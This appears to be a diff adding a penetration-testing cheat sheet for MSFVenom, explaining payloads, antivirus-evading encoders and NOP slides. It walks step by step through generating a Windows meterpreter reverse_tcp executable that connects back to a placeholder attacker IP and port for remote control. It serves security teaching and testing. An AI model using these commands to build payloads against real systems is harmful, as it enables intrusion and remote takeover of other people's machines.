@@ -1,0 +1,76 @@
+# MSFVenom - CheatSheet
+
+
+# 👉 Overview
+
+---
+
+### 👀 What ?
+
+> MSFVenom is a payload generation and encoding tool that forms part of the Metasploit Framework, a toolkit for penetration testing, exploit development, and vulnerability research. It allows cybersecurity professionals to generate custom payloads, which can be used to exploit vulnerabilities in a target system.
+> 
+
+### 🧐 Why ?
+
+> Understanding and effectively using MSFVenom is essential for cybersecurity professionals, particularly those involved in penetration testing or red teaming. The tool is versatile and powerful, enabling the creation of numerous types of payloads for various platforms and for different purposes. It can be used to test the robustness of systems and to identify potential vulnerabilities that could be exploited by malicious hackers.
+> 
+
+### ⛏️ How ?
+
+> To use MSFVenom, you first need to choose the payload you want to create. This will depend on the target system and the type of exploit you are planning. Once you have chosen the payload, you can use the '-p' option in MSFVenom to specify it. For instance, to create a reverse TCP shell payload for a Windows system, you might use the command 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port> -f exe > payload.exe'.
+> 
+
+### ⏳ When ?
+
+> MSFVenom is typically used in the exploitation phase of a penetration test, after potential vulnerabilities have been identified. However, it can also be used in the reconnaissance and scanning phases to create decoy traffic or to probe for weaknesses.
+> 
+
+# ⚙️ Technical Explanations
+
+---
+
+MSFVenom is a powerful tool in the Metasploit Framework, designed to generate payloads for penetration testing and exploit development. It works by combining three main elements: payloads, encoders, and NOP slides.
+
+A payload is essentially a piece of code designed to carry out a specific task. This could be anything from creating a reverse shell on the target system, which allows for remote control, to adding a new user with admin rights, providing further access to compromised systems.
+
+Encoders serve a crucial role in the evasion of detection by security systems. These function by transforming the payload into a different format, thereby helping it to bypass anti-virus software and intrusion detection systems. The encoder disguises the malicious intent of the payload, making it appear benign to security systems.
+
+NOP slides, on the other hand, are sequences of 'no operation' instructions used in exploits. These are particularly useful when the exact memory location of the payload is unknown. In essence, a NOP slide creates a 'slippery slope' that leads the execution flow of a program straight to the payload, even when the precise location of this payload in memory is not known.
+
+Together, these three elements allow MSFVenom to generate a wide variety of custom payloads, each tailored to exploit a specific vulnerability in a target system. The tool's versatility and power make it an essential asset for cybersecurity professionals in the fields of penetration testing and red teaming.
+
+Let's take an example of creating a payload that opens a reverse shell on a Windows target.
+
+**Step 1:** Choose the Payload
+We'll use the 'windows/meterpreter/reverse_tcp' payload. This payload creates a reverse TCP connection from the target system to the attacker's system.
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp
+
+```
+
+**Step 2:** Specify the Local Host (LHOST) and Local Port (LPORT)
+LHOST and LPORT are the IP address and port on the attacker's machine that the reverse connection will communicate with. Replace `<Your IP Address>` and `<Your Port>` with your actual IP address and port number.
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port>
+
+```
+
+**Step 3:** Specify the File Type
+The '-f' option is used to specify the file type of the payload. In this case, we'll use 'exe' to create an executable file.
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port> -f exe
+
+```
+
+**Step 4:** Output the Payload
+Finally, we'll use the '>' operator to output the payload to a file named 'payload.exe'.
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port> -f exe > payload.exe
+
+```
+
+Now, you have a custom payload that, when executed on a Windows system, will open a reverse TCP connection back to your specified IP address and port, allowing you remote control of the system.
